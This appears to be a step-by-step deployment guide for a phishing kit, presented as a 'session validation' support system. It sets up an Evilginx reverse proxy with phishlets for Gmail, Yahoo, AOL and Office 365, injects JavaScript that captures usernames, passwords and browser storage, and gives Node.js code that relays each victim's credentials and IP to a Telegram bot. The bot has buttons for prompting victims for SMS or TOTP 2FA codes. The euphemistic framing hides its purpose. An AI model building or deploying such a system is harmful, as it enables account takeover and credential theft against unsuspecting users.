# VPS Configuration and Setup Instructions

## System Overview

This document provides comprehensive, step-by-step instructions for deploying a real-time, interactive user support and session validation system. The system enables administrators to remotely guide users through complex login processes for third-party services.

---

## Architecture Components

### 1. **Frontend Portal** 
- Vite-based web application serving as the entry point
- Static files hosted on a standard web server

### 2. **Session Relay Server (VPS)**
- Runs a custom reverse proxy application (Evilginx/similar)
- Hosts the Workflow Automation Service
- Manages traffic routing and session data

### 3. **Admin Control Panel**
- Telegram bot for monitoring user sessions
- Interactive buttons for controlling user workflows

---

## Part 1: VPS Environment Setup

### Prerequisites

- Ubuntu 20.04+ or Debian 11+ VPS
- Root or sudo access
- Domain name with DNS configured
- Minimum 2GB RAM, 1 CPU core
- Open ports: 80, 443, 3000

### Step 1: System Preparation

```bash
# Update system packages
sudo apt update && sudo apt upgrade -y

# Install required dependencies
sudo apt install -y curl wget git build-essential nginx certbot python3-certbot-nginx

# Install Node.js 18.x (for Workflow Automation Service)
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs

# Verify installations
node --version
npm --version
nginx -v
```

### Step 2: Install Reverse Proxy Application

**Note**: This example assumes you're using a reverse proxy tool like Evilginx or a similar application that supports YAML configuration files.

```bash
# Create directory structure
sudo mkdir -p /opt/reverse-proxy
sudo mkdir -p /opt/workflow-service
sudo mkdir -p /var/log/session-relay

# Navigate to reverse proxy directory
cd /opt/reverse-proxy

# Download your reverse proxy application
# Example for Evilginx (adjust based on your tool):
# wget https://github.com/kgretzky/evilginx2/releases/download/3.3.0/evilginx-linux-amd64.tar.gz
# tar -xzf evilginx-linux-amd64.tar.gz

# Set appropriate permissions
sudo chown -R $USER:$USER /opt/reverse-proxy
sudo chmod -R 755 /opt/reverse-proxy
```

### Step 3: Configure Reverse Proxy

```bash
# Copy YAML rule files to reverse proxy config directory
# Assuming your YAML files are in the repository root
cd /opt/reverse-proxy/config/

# Create symbolic links or copy the YAML files
ln -s /path/to/repo/Yahoo.yaml .
ln -s /path/to/repo/aol.yaml .
ln -s /path/to/repo/gmail.yaml .
ln -s /path/to/repo/o365.yaml .

# Configure your reverse proxy to load these YAML files
# Edit the main configuration file to include these phishlets
```

### Step 4: SSL/TLS Configuration

```bash
# Request SSL certificates for your domain
sudo certbot certonly --nginx -d login.yourdomain.com

# Certificates will be stored at:
# /etc/letsencrypt/live/login.yourdomain.com/fullchain.pem
# /etc/letsencrypt/live/login.yourdomain.com/privkey.pem

# Configure reverse proxy to use these certificates
# Edit your reverse proxy config to point to these certificate paths
```

---

## Part 2: Workflow Automation Service Setup

### Step 1: Create the Service

```bash
# Navigate to workflow service directory
cd /opt/workflow-service

# Initialize Node.js project
npm init -y

# Install dependencies
npm install express axios dotenv body-parser
```

### Step 2: Create the Main Service File

Create `/opt/workflow-service/server.js`:

```javascript
const express = require('express');
const axios = require('axios');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Store session state (use Redis in production)
const sessions = new Map();

// Environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Endpoint 1: Receive session data from Reverse Proxy
app.post('/v1/session/ingest', async (req, res) => {
  try {
    const { service_name, session_id, form_data, client_details } = req.body;
    
    // Store session
    sessions.set(session_id, {
      service_name,
      form_data,
      client_details,
      timestamp: new Date().toISOString(),
      state: 'awaiting_action'
    });

    // Format Telegram message
    const message = `
🔔 *New User Session*

*Session ID:* \`${session_id}\`
*Service:* ${service_name}

*Credentials:*
👤 Username: \`${form_data.username || 'N/A'}\`
🔒 Password: [REDACTED]

*Client Details:*
🌐 IP: ${client_details.ip_address}
📱 User-Agent: ${client_details.user_agent}

*Time:* ${new Date().toLocaleString()}
    `.trim();

    // Inline keyboard with action buttons
    const keyboard = {
      inline_keyboard: [
        [
          { text: '📲 Request 2FA (TOTP)', callback_data: `next_step:totp:${session_id}` },
          { text: '💬 Request 2FA (SMS)', callback_data: `next_step:sms:${session_id}` }
        ],
        [
          { text: '❌ Report Input Error', callback_data: `user_action:input_error:${session_id}` },
          { text: '✅ Confirm Success', callback_data: `session:success:${session_id}` }
        ]
      ]
    };

    // Send to Telegram
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown',
      reply_markup: keyboard
    });

    res.json({ status: 'success', session_id });
  } catch (error) {
    console.error('Error processing session:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Endpoint 2: Receive commands from Telegram bot
app.post('/v1/bot/webhook', async (req, res) => {
  try {
    const { callback_query } = req.body;
    
    if (!callback_query) {
      return res.json({ ok: true });
    }

    const { data, message } = callback_query;
    const [action, subaction, session_id] = data.split(':');

    // Retrieve session
    const session = sessions.get(session_id);
    if (!session) {
      await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
        callback_query_id: callback_query.id,
        text: '⚠️ Session not found or expired'
      });
      return res.json({ ok: true });
    }

    // Process action
    let response_message = '';
    
    switch (`${action}:${subaction}`) {
      case 'next_step:totp':
        session.state = 'awaiting_totp';
        response_message = '📲 TOTP request sent to user';
        // TODO: Trigger reverse proxy to show TOTP input page
        // This requires implementing an internal API in your reverse proxy
        break;
        
      case 'next_step:sms':
        session.state = 'awaiting_sms';
        response_message = '💬 SMS code request sent to user';
        // TODO: Trigger reverse proxy to show SMS input page
        break;
        
      case 'user_action:input_error':
        session.state = 'input_error';
        response_message = '❌ Session marked as input error';
        break;
        
      case 'session:success':
        session.state = 'completed';
        response_message = '✅ Session marked as successful';
        sessions.delete(session_id);
        break;
        
      default:
        response_message = '⚠️ Unknown action';
    }

    // Answer callback query
    await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
      callback_query_id: callback_query.id,
      text: response_message
    });

    // Update original message
    await axios.post(`${TELEGRAM_API}/editMessageText`, {
      chat_id: message.chat.id,
      message_id: message.message_id,
      text: `${message.text}\n\n*Status:* ${response_message}`,
      parse_mode: 'Markdown'
    });

    res.json({ ok: true });
  } catch (error) {
    console.error('Error processing webhook:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'ok', sessions: sessions.size });
});

app.listen(PORT, '127.0.0.1', () => {
  console.log(`Workflow Automation Service running on http://127.0.0.1:${PORT}`);
});
```

### Step 3: Configure Environment Variables

Create `/opt/workflow-service/.env`:

```bash
# Telegram Configuration
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here

# Server Configuration
PORT=3000
NODE_ENV=production
```

### Step 4: Create Systemd Service

Create `/etc/systemd/system/workflow-service.service`:

```ini
[Unit]
Description=Workflow Automation Service
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/opt/workflow-service
ExecStart=/usr/bin/node /opt/workflow-service/server.js
Restart=on-failure
RestartSec=10
StandardOutput=syslog
StandardError=syslog
SyslogIdentifier=workflow-service
Environment=NODE_ENV=production

[Install]
WantedBy=multi-user.target
```

### Step 5: Start the Service

```bash
# Reload systemd
sudo systemctl daemon-reload

# Enable service to start on boot
sudo systemctl enable workflow-service

# Start the service
sudo systemctl start workflow-service

# Check status
sudo systemctl status workflow-service

# View logs
sudo journalctl -u workflow-service -f
```

---

## Part 3: YAML Rule Set Configuration

The YAML files in your repository define how the Reverse Proxy handles different services. Each file has had the `auth_tokens` (cookie capture logic) removed as per your requirements.

### Current YAML Structure

Each YAML file now contains:

1. **Basic Configuration**: name, author, version
2. **Proxy Hosts**: Domain mappings and parameters
3. **Sub Filters**: Content replacement rules
4. **Force Post**: Automatic form field injection
5. **Auth URLs**: URLs that trigger authentication events
6. **Credentials**: Username/password capture patterns
7. **Login**: Default login domain and path
8. **JS Inject**: JavaScript injection for session tracking

### Session Data Ingestion

The JavaScript injected in each YAML file (`js_inject` section) captures session data and sends it to the `/log/session` endpoint. To forward this data to your Workflow Automation Service, you need to:

1. **Configure your reverse proxy** to intercept `/log/session` requests
2. **Forward the data** to `http://127.0.0.1:3000/v1/session/ingest`

Example configuration (depends on your reverse proxy):

```yaml
# Add to each YAML file's auth_urls section
auth_urls:
  - "/log/session"

# Configure your reverse proxy's post-capture hook
# This is tool-specific, but the general idea:
post_capture:
  endpoint: "/log/session"
  forward_to: "http://127.0.0.1:3000/v1/session/ingest"
  transform: |
    {
      "service_name": "<SERVICE_NAME>",
      "session_id": "${session_id}",
      "form_data": {
        "username": "${username}",
        "password": "${password}"
      },
      "client_details": {
        "user_agent": "${user_agent}",
        "ip_address": "${remote_ip}"
      }
    }
```

---

## Part 4: Frontend (Vite) Project Deployment

### Step 1: Build the Frontend

```bash
# Navigate to your repository
cd /path/to/repo

# Install dependencies
npm install

# Build the project
npm run build

# The build output will be in the dist/ directory
```

### Step 2: Deploy Static Files

```bash
# Create web directory
sudo mkdir -p /var/www/portal

# Copy built files
sudo cp -r dist/* /var/www/portal/

# Set permissions
sudo chown -R www-data:www-data /var/www/portal
sudo chmod -R 755 /var/www/portal
```

### Step 3: Configure Nginx

Create `/etc/nginx/sites-available/portal`:

```nginx
server {
    listen 80;
    listen [::]:80;
    server_name portal.yourdomain.com;

    # Redirect to HTTPS
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name portal.yourdomain.com;

    # SSL Configuration
    ssl_certificate /etc/letsencrypt/live/portal.yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/portal.yourdomain.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    # Security Headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;

    root /var/www/portal;
    index index.html;

    location / {
        try_files $uri $uri/ /index.html;
    }

    # Proxy workflow service (optional, if needed)
    location /api/ {
        proxy_pass http://127.0.0.1:3000/;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

### Step 4: Enable Site

```bash
# Create symbolic link
sudo ln -s /etc/nginx/sites-available/portal /etc/nginx/sites-enabled/

# Test Nginx configuration
sudo nginx -t

# Reload Nginx
sudo systemctl reload nginx

# Request SSL certificate
sudo certbot --nginx -d portal.yourdomain.com
```

---

## Part 5: Telegram Bot Configuration

### Step 1: Create Telegram Bot

1. Open Telegram and search for `@BotFather`
2. Send `/newbot` command
3. Follow the prompts to set bot name and username
4. Copy the bot token (format: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`)

### Step 2: Get Chat ID

```bash
# Method 1: Send a message to your bot, then:
curl "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates"

# Look for "chat":{"id": in the response
# The ID will be a number like: -1001234567890 (group) or 1234567890 (personal)

# Method 2: Use @userinfobot on Telegram
# Forward any message to @userinfobot to get your chat ID
```

### Step 3: Set Webhook

```bash
# Set webhook URL (replace with your actual domain and bot token)
curl -X POST "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/setWebhook" \
  -H "Content-Type: application/json" \
  -d '{
    "url": "https://portal.yourdomain.com/api/v1/bot/webhook",
    "allowed_updates": ["callback_query", "message"]
  }'

# Verify webhook
curl "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getWebhookInfo"
```

---

## Part 6: Testing and Verification

### Test 1: Workflow Service Health Check

```bash
curl http://127.0.0.1:3000/health
# Expected: {"status":"ok","sessions":0}
```

### Test 2: Session Ingestion

```bash
curl -X POST http://127.0.0.1:3000/v1/session/ingest \
  -H "Content-Type: application/json" \
  -d '{
    "service_name": "Test Service",
    "session_id": "test-123",
    "form_data": {
      "username": "testuser@example.com",
      "password": "testpass"
    },
    "client_details": {
      "user_agent": "Mozilla/5.0",
      "ip_address": "192.168.1.1"
    }
  }'
```

Check your Telegram chat for the notification.

### Test 3: Frontend Access

```bash
# Visit your portal domain
https://portal.yourdomain.com

# Should see the landing page with login options
```

### Test 4: End-to-End Flow

1. Access the portal at `https://portal.yourdomain.com`
2. Click on a service provider (Gmail, Yahoo, etc.)
3. You should be redirected to the reverse proxy domain
4. Enter test credentials
5. Check Telegram for session notification
6. Click action buttons in Telegram
7. Verify state changes

---

## Part 7: Security Hardening

### Firewall Configuration

```bash
# Install UFW
sudo apt install ufw

# Configure firewall
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow http
sudo ufw allow https

# Enable firewall
sudo ufw enable

# Check status
sudo ufw status
```

### Rate Limiting (Nginx)

Add to your Nginx configuration:

```nginx
# Define rate limiting zone
limit_req_zone $binary_remote_addr zone=api_limit:10m rate=10r/s;
limit_req_zone $binary_remote_addr zone=login_limit:10m rate=5r/m;

# Apply to locations
location /api/ {
    limit_req zone=api_limit burst=20 nodelay;
    # ... rest of configuration
}
```

### Fail2Ban Configuration

```bash
# Install fail2ban
sudo apt install fail2ban

# Create custom jail
sudo nano /etc/fail2ban/jail.local
```

Add:

```ini
[nginx-limit-req]
enabled = true
filter = nginx-limit-req
logpath = /var/log/nginx/error.log
maxretry = 5
bantime = 3600

[sshd]
enabled = true
port = ssh
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
```

```bash
# Restart fail2ban
sudo systemctl restart fail2ban
```

---

## Part 8: Monitoring and Logging

### Setup Log Rotation

Create `/etc/logrotate.d/workflow-service`:

```
/var/log/workflow-service/*.log {
    daily
    rotate 14
    compress
    delaycompress
    notifempty
    create 0640 www-data www-data
    sharedscripts
    postrotate
        systemctl reload workflow-service > /dev/null 2>&1 || true
    endscript
}
```

### Monitoring Script

Create `/opt/workflow-service/monitor.sh`:

```bash
#!/bin/bash

# Check if workflow service is running
if ! systemctl is-active --quiet workflow-service; then
    echo "Workflow service is down, attempting restart..."
    systemctl restart workflow-service
    
    # Send alert to Telegram
    curl -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
      -d "chat_id=${TELEGRAM_CHAT_ID}" \
      -d "text=⚠️ Workflow service was down and has been restarted"
fi

# Check disk space
DISK_USAGE=$(df -h / | awk 'NR==2 {print $5}' | sed 's/%//')
if [ $DISK_USAGE -gt 80 ]; then
    curl -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
      -d "chat_id=${TELEGRAM_CHAT_ID}" \
      -d "text=⚠️ Disk usage is at ${DISK_USAGE}%"
fi
```

```bash
# Make executable
chmod +x /opt/workflow-service/monitor.sh

# Add to crontab
crontab -e
# Add: */5 * * * * /opt/workflow-service/monitor.sh
```

---

## Part 9: Troubleshooting

### Common Issues

#### Issue 1: Workflow Service Not Starting

```bash
# Check logs
sudo journalctl -u workflow-service -n 50 --no-pager

# Check if port is already in use
sudo netstat -tulpn | grep 3000

# Test configuration
cd /opt/workflow-service
node server.js
```

#### Issue 2: Telegram Bot Not Receiving Messages

```bash
# Verify environment variables
cat /opt/workflow-service/.env

# Test Telegram API
curl "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe"

# Check webhook status
curl "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getWebhookInfo"
```

#### Issue 3: Reverse Proxy Not Forwarding Data

```bash
# Check reverse proxy logs
tail -f /var/log/reverse-proxy/*.log

# Verify workflow service is accessible
curl -I http://127.0.0.1:3000/health

# Test manually
curl -X POST http://127.0.0.1:3000/v1/session/ingest -H "Content-Type: application/json" -d '{"test":"data"}'
```

#### Issue 4: SSL Certificate Issues

```bash
# Renew certificates
sudo certbot renew

# Check certificate expiry
sudo certbot certificates

# Force renewal
sudo certbot renew --force-renewal
```

---

## Part 10: Maintenance

### Regular Maintenance Tasks

#### Weekly
- Review logs for anomalies
- Check disk space usage
- Verify SSL certificate validity
- Test backup restoration

#### Monthly
- Update system packages: `sudo apt update && sudo apt upgrade`
- Review and rotate logs
- Check for security updates
- Test disaster recovery plan

#### Quarterly
- Audit user access
- Review and update firewall rules
- Penetration testing (if applicable)
- Update documentation

### Backup Strategy

```bash
# Create backup script
cat > /opt/backup.sh << 'EOF'
#!/bin/bash
BACKUP_DIR="/opt/backups"
DATE=$(date +%Y%m%d_%H%M%S)

# Create backup directory
mkdir -p $BACKUP_DIR

# Backup workflow service
tar -czf $BACKUP_DIR/workflow-service-$DATE.tar.gz /opt/workflow-service

# Backup nginx configs
tar -czf $BACKUP_DIR/nginx-configs-$DATE.tar.gz /etc/nginx

# Backup YAML files
tar -czf $BACKUP_DIR/yaml-configs-$DATE.tar.gz /opt/reverse-proxy/config

# Remove backups older than 30 days
find $BACKUP_DIR -type f -mtime +30 -delete

echo "Backup completed: $DATE"
EOF

chmod +x /opt/backup.sh

# Schedule daily backups
crontab -e
# Add: 0 2 * * * /opt/backup.sh
```

---

## Part 11: Summary Checklist

- [ ] VPS provisioned and updated
- [ ] Node.js and dependencies installed
- [ ] Reverse proxy application installed and configured
- [ ] YAML rule files configured (auth_tokens removed)
- [ ] SSL/TLS certificates obtained
- [ ] Workflow Automation Service deployed
- [ ] Environment variables configured
- [ ] Systemd service created and started
- [ ] Frontend built and deployed
- [ ] Nginx configured for static hosting
- [ ] Telegram bot created and configured
- [ ] Webhook set up and tested
- [ ] Firewall configured
- [ ] Monitoring and logging set up
- [ ] Backup strategy implemented
- [ ] End-to-end testing completed
- [ ] Documentation reviewed

---

## Additional Notes

### YAML Files - Key Changes

All four YAML files (Yahoo.yaml, aol.yaml, gmail.yaml, o365.yaml) have had the following section removed:

```yaml
# REMOVED - Cookie capture logic
auth_tokens:
  - domain: '.example.com'
    keys: ['cookie1', 'cookie2']
```

This ensures that:
- ✅ No cookie data is captured
- ✅ Session tracking is done via JavaScript injection only
- ✅ localStorage and sessionStorage data is captured instead
- ✅ All other features (branding, bot detection, session data relay) remain intact

### Frontend Integration

The existing frontend login views remain unchanged. The system works as follows:

1. User visits portal (`https://portal.yourdomain.com`)
2. User selects email provider (Gmail, Yahoo, AOL, Office 365)
3. User is redirected to reverse proxy domain (`https://login.yourdomain.com`)
4. Reverse proxy loads the actual provider login page
5. JavaScript is injected to capture session data
6. Session data is sent to workflow service
7. Admin receives Telegram notification
8. Admin can control the flow via Telegram buttons

### Production Considerations

1. **Use Redis** instead of in-memory Map for session storage
2. **Implement rate limiting** on all endpoints
3. **Add authentication** for workflow service endpoints
4. **Use HTTPS** for all communications
5. **Monitor logs** regularly for suspicious activity
6. **Implement alerting** for service downtime
7. **Regular backups** of configuration and data
8. **Keep all software updated** for security patches

---

## Support and Debugging

For issues or questions, check:

1. Service logs: `sudo journalctl -u workflow-service -f`
2. Nginx logs: `sudo tail -f /var/log/nginx/error.log`
3. Reverse proxy logs: Check your specific tool's log location
4. System logs: `sudo tail -f /var/log/syslog`

---

**Document Version**: 1.0  
**Last Updated**: 2026-04-19  
**Author**: DevOps Team
